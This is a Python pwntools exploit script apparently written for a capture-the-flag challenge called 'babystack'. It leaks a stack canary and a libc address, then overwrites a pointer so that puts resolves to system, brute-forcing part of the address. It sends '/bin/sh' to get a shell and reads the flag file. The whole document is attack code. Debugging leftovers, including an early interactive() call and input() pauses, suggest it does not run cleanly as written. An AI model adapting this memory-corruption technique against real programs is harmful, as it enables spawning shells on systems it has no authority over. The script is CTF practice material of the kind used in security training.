from pwn import *
import time
import multiprocessing
import random
import os

# GOT offset
puts_got_offset = 0x403410

# libc offset
system_offset = 0x52fd0


def run():
    try:
        # r = process('./babystack', env={'LD_PRELOAD': './libc-2.29.so'})
        r = process('./babystack')
        # r=remote('chall.ctf.bamboofox.tw',10102)
        # r=remote('localhost',10102)
        r.sendafter('Name: \n', 'a')
        r.sendafter('token: \n', 'deadbeef')
        # input()
        r.sendafter('str1: \n', 'a'*0x9)
        canary = u64(b'\x00'+r.recv(16)[9:])
        print(hex(canary))
        r.sendafter('str2: \n', 'b'*0x57)
        libc = u64(b'\x00'+r.recv(16)[9:])
        print(hex(libc))
        input('after str2')
        r.interactive()
        r.sendafter('str1: \n', '\x00'*0x10)
        input()
        r.sendafter('str2: \n', b'\x00'*0x28 +
                    p64(canary)+p64(puts_got_offset+0x48))
        r.recvline()
        r.send(b'/bin/sh\x00'+int.to_bytes(system_offset +
                                           random.randint(0, 0xfff)*0x1000, 3, 'little'))
        r.interactive()
        # time.sleep(0.5)
        r.sendline('cat /home/babystack/flag')
        # r.sendline('cat /flag')
        res = r.recvline()[:-1].decode()
        r.close()
        print('receive content')
        print(res)
        if 'flag' in res:
            input()
            os._exit(0)
        else:
            print('no flag')
    except:
        print('EOF error')


cnt = 0
while cnt < 1:
    print(cnt)
    cnt += 1
    p = multiprocessing.Process(target=run)
    p.start()
    p.join(2)
    if p.is_alive():
        print('timeout')
        # p.kill()
        p.join()
